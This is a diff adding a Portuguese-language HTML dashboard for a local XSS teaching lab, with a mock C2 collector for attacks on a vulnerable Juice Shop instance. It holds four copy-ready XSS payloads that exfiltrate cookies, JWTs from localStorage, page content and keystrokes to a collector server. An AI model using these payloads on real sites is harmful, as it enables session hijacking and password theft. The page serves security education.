@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Central de Comando — XSS Demo</title>
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+
+<header>
+  <div class="header-inner">
+    <div class="logo">
+      <span class="logo-icon">⚡</span>
+      CENTRAL DE COMANDO
+      <span class="badge-c2">C2 SERVER</span>
+    </div>
+    <div class="header-status">
+      <div class="pulse" id="sse-pulse" style="background:var(--red)"></div>
+      <span id="sse-status">Conectando...</span>
+      &nbsp;|&nbsp;
+      <span id="header-count">0</span> capturas
+      &nbsp;|&nbsp;
+      <a href="http://localhost:3000" target="_blank" rel="noopener"
+         style="color:var(--orange);text-decoration:none">Alvo :3000</a>
+      &nbsp;|&nbsp;
+      <a href="http://localhost:3001" target="_blank" rel="noopener"
+         style="color:var(--green);text-decoration:none">Seguro :3001</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+  <!-- ── Stats bar ── -->
+  <div class="stats-bar">
+    <div class="stat-card red">
+      <div class="stat-icon">🎯</div>
+      <div>
+        <div class="stat-value" id="stat-total">0</div>
+        <div class="stat-label">Total de Capturas</div>
+      </div>
+    </div>
+    <div class="stat-card orange">
+      <div class="stat-icon">🍪</div>
+      <div>
+        <div class="stat-value" id="stat-cookie">0</div>
+        <div class="stat-label">Cookies / Sessões</div>
+      </div>
+    </div>
+    <div class="stat-card blue">
+      <div class="stat-icon">🔑</div>
+      <div>
+        <div class="stat-value" id="stat-jwt">0</div>
+        <div class="stat-label">Tokens JWT</div>
+      </div>
+    </div>
+    <div class="stat-card green">
+      <div class="stat-icon">⏱️</div>
+      <div>
+        <div class="stat-value" id="stat-last" style="font-size:1rem">—</div>
+        <div class="stat-label">Última Captura</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Fluxo + Dados ── -->
+  <div class="two-col">
+
+    <!-- Fluxo de Ataque -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title">🔄 Fluxo do Ataque</span>
+      </div>
+      <div class="flow-diagram" id="flow-diagram">
+        <div class="flow-node node-attacker">
+          <div class="node-icon">👤</div>
+          <div class="node-label">Atacante</div>
+          <div class="node-sub">injeta payload</div>
+        </div>
+        <div class="flow-arrow" id="arrow-1">
+          <div class="arrow-line"></div>
+          <div class="arrow-label">XSS</div>
+        </div>
+        <div class="flow-node node-target">
+          <div class="node-icon">🛒</div>
+          <div class="node-label">Juice Shop<br>Vulnerável</div>
+          <div class="node-sub">:3000</div>
+        </div>
+        <div class="flow-arrow" id="arrow-2">
+          <div class="arrow-line"></div>
+          <div class="arrow-label">visita</div>
+        </div>
+        <div class="flow-node node-victim">
+          <div class="node-icon">👥</div>
+          <div class="node-label">Vítima<br>executa</div>
+          <div class="node-sub">browser</div>
+        </div>
+        <div class="flow-arrow" id="arrow-3">
+          <div class="arrow-line"></div>
+          <div class="arrow-label">exfil</div>
+        </div>
+        <div class="flow-node node-c2">
+          <div class="node-icon">⚡</div>
+          <div class="node-label">C2 Server</div>
+          <div class="node-sub">:4000</div>
+        </div>
+      </div>
+
+      <!-- Tipos de dados roubados -->
+      <div style="padding:0 18px 18px">
+        <div style="font-size:0.75rem;font-weight:700;text-transform:uppercase;
+                    letter-spacing:0.5px;color:var(--muted);margin-bottom:10px">
+          Tipos de Dados Roubados
+        </div>
+        <div class="data-types-grid">
+          <div class="data-type-item">
+            <div class="dt-icon">🍪</div>
+            <div>
+              <div class="dt-name" style="color:var(--orange)">Cookies de Sessão</div>
+              <div class="dt-desc">Cookie <code>token</code> ou <code>PHPSESSID</code> permite sequestrar a sessão autenticada da vítima sem precisar da senha.</div>
+              <div class="dt-example">document.cookie → "token=abc123; session=xyz"</div>
+            </div>
+          </div>
+          <div class="data-type-item">
+            <div class="dt-icon">🔑</div>
+            <div>
+              <div class="dt-name" style="color:var(--blue)">JWT do localStorage</div>
+              <div class="dt-desc">O Juice Shop armazena o token de autenticação JWT no localStorage. Qualquer script pode lê-lo e usá-lo para fazer requisições autenticadas.</div>
+              <div class="dt-example">localStorage.getItem('token') → "eyJhbGci..."</div>
+            </div>
+          </div>
+          <div class="data-type-item">
+            <div class="dt-icon">📄</div>
+            <div>
+              <div class="dt-name" style="color:var(--purple)">Snapshot do DOM</div>
+              <div class="dt-desc">O script pode capturar todo o conteúdo da página — formulários, dados do usuário, informações visíveis — e exfiltrar silenciosamente.</div>
+              <div class="dt-example">document.body.innerHTML → HTML da página completo</div>
+            </div>
+          </div>
+          <div class="data-type-item">
+            <div class="dt-icon">⌨️</div>
+            <div>
+              <div class="dt-name" style="color:var(--red)">Keylogger</div>
+              <div class="dt-desc">Captura teclas digitadas em campos de login, incluindo senhas, em tempo real enquanto a vítima digita normalmente.</div>
+              <div class="dt-example">addEventListener('keydown') → envia cada tecla</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Instruções de uso -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title">📋 Como Usar</span>
+      </div>
+      <div class="panel-body">
+        <div class="instruction-list">
+          <div class="instruction-item">
+            <div class="instr-num">1</div>
+            <div class="instr-text">
+              Suba os ambientes com <code>docker-compose up</code> e abra esta central em
+              <code>localhost:4000</code>
+            </div>
+          </div>
+          <div class="instruction-item">
+            <div class="instr-num">2</div>
+            <div class="instr-text">
+              Acesse o Juice Shop vulnerável em <code>localhost:3000</code> e navegue até
+              a página alvo do ataque (busca, avaliações, etc.)
+            </div>
+          </div>
+          <div class="instruction-item">
+            <div class="instr-num">3</div>
+            <div class="instr-text">
+              Na aba <strong>Payloads</strong>, copie o payload do tipo de ataque desejado
+              e cole no campo vulnerável do Juice Shop
+            </div>
+          </div>
+          <div class="instruction-item">
+            <div class="instr-num">4</div>
+            <div class="instr-text">
+              Observe na aba <strong>Capturas</strong> os dados chegando em tempo real:
+              cookies, JWT, conteúdo do DOM ou teclas digitadas
+            </div>
+          </div>
+          <div class="instruction-item">
+            <div class="instr-num">5</div>
+            <div class="instr-text">
+              Para demonstrar a defesa, repita o ataque no ambiente seguro
+              <code>localhost:3001</code> — os payloads não serão executados
+            </div>
+          </div>
+        </div>
+
+        <div style="margin-top:16px;padding:12px 14px;background:var(--panel2);
+                    border:1px solid var(--border);border-radius:7px;
+                    border-left:3px solid var(--red)">
+          <div style="font-size:0.75rem;font-weight:700;color:var(--red);margin-bottom:6px">
+            ⚠️ Apenas para fins educacionais
+          </div>
+          <div style="font-size:0.75rem;color:var(--muted);line-height:1.5">
+            Este ambiente simula um servidor C2 em laboratório local. Os ataques
+            demonstrados são técnicas reais que devem ser usadas exclusivamente
+            em ambientes controlados com autorização explícita.
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Payloads + Capturas (full width com tabs) ── -->
+  <div class="panel full-width">
+    <div class="tabs">
+      <button class="tab-btn active" data-tab="captures">
+        📥 Capturas Ao Vivo <span id="tab-count">(0)</span>
+      </button>
+      <button class="tab-btn" data-tab="payloads">⚡ Payloads</button>
+    </div>
+
+    <!-- Tab: Capturas -->
+    <div class="tab-content active" id="tab-captures">
+      <div class="captures-header">
+        <span style="font-size:0.82rem;color:var(--muted)">
+          Dados exfiltrados pelos payloads XSS em tempo real
+        </span>
+        <button class="btn-clear" id="btn-clear">Limpar Capturas</button>
+      </div>
+      <div class="captures-list" id="captures-list">
+        <div class="empty-captures" id="empty-msg">
+          <span class="empty-icon">📭</span>
+          Aguardando capturas...<br>
+          Injete um payload no Juice Shop vulnerável para ver os dados aqui.
+        </div>
+      </div>
+    </div>
+
+    <!-- Tab: Payloads -->
+    <div class="tab-content" id="tab-payloads">
+      <div class="payload-grid" id="payload-grid">
+
+        <!-- Payload 1: Cookie Theft (Reflected XSS) -->
+        <div class="payload-card">
+          <div class="payload-card-header">
+            <span class="payload-type-badge badge-reflected">Refletido</span>
+            <span class="payload-card-title">Roubo de Cookie via Busca</span>
+            <span class="payload-target">alvo: /search?q=</span>
+          </div>
+          <pre class="payload-code" id="p1"><script>fetch('http://localhost:4000/capture',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'cookie',data:document.cookie,url:location.href,ua:navigator.userAgent})})</script></pre>
+          <div class="payload-footer">
+            <span class="payload-desc">Exfiltra cookies via fetch POST. Cole na barra de busca do Juice Shop.</span>
+            <button class="btn-copy" data-target="p1">Copiar</button>
+          </div>
+        </div>
+
+        <!-- Payload 2: JWT Theft (Stored XSS) -->
+        <div class="payload-card">
+          <div class="payload-card-header">
+            <span class="payload-type-badge badge-stored">Armazenado</span>
+            <span class="payload-card-title">Roubo de JWT + Email</span>
+            <span class="payload-target">alvo: avaliações de produto</span>
+          </div>
+          <pre class="payload-code" id="p2"><img src=x onerror="fetch('http://localhost:4000/capture',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'jwt',data:document.cookie,jwt:localStorage.getItem('token'),email:localStorage.getItem('email'),url:location.href})})"></pre>
+          <div class="payload-footer">
+            <span class="payload-desc">Roubo do JWT do localStorage — o Juice Shop armazena autenticação lá. Cole em uma avaliação.</span>
+            <button class="btn-copy" data-target="p2">Copiar</button>
+          </div>
+        </div>
+
+        <!-- Payload 3: DOM Snapshot -->
+        <div class="payload-card">
+          <div class="payload-card-header">
+            <span class="payload-type-badge badge-dom">DOM-Based</span>
+            <span class="payload-card-title">Snapshot do Conteúdo da Página</span>
+            <span class="payload-target">alvo: qualquer campo vulnerável</span>
+          </div>
+          <pre class="payload-code" id="p3"><img src=x onerror="new Image().src='http://localhost:4000/capture?type=dom&url='+encodeURIComponent(location.href)+'&data='+encodeURIComponent(document.title)+'&extra='+encodeURIComponent(document.body.innerText.slice(0,300))"></pre>
+          <div class="payload-footer">
+            <span class="payload-desc">Exfiltra título, URL e trecho do conteúdo da página via parâmetro de imagem.</span>
+            <button class="btn-copy" data-target="p3">Copiar</button>
+          </div>
+        </div>
+
+        <!-- Payload 4: Keylogger -->
+        <div class="payload-card">
+          <div class="payload-card-header">
+            <span class="payload-type-badge badge-keylog">Keylogger</span>
+            <span class="payload-card-title">Captura de Teclas (Login/Senha)</span>
+            <span class="payload-target">alvo: páginas com formulários</span>
+          </div>
+          <pre class="payload-code" id="p4"><script>
+(function(){
+  let buf='';
+  document.addEventListener('keydown',function(e){
+    buf+=e.key==='Enter'?'[ENTER]':e.key==='Backspace'?'[BS]':e.key.length===1?e.key:'';
+    if(buf.length>40){
+      fetch('http://localhost:4000/capture',{method:'POST',mode:'no-cors',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({type:'keylog',keylog:buf,url:location.href})});
+      buf='';
+    }
+  });
+})();
+</script></pre>
+          <div class="payload-footer">
+            <span class="payload-desc">Captura teclas digitadas e envia em lotes de 40 caracteres. Eficaz em páginas de login.</span>
+            <button class="btn-copy" data-target="p4">Copiar</button>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+</main>
+
+<footer>
+  Central de Comando — XSS Demo &nbsp;|&nbsp; Ambiente educacional local &nbsp;|&nbsp;
+  Segurança de Sistemas — 2025
+</footer>
+
+<script src="/dashboard.js"></script>
+</body>
+</html>
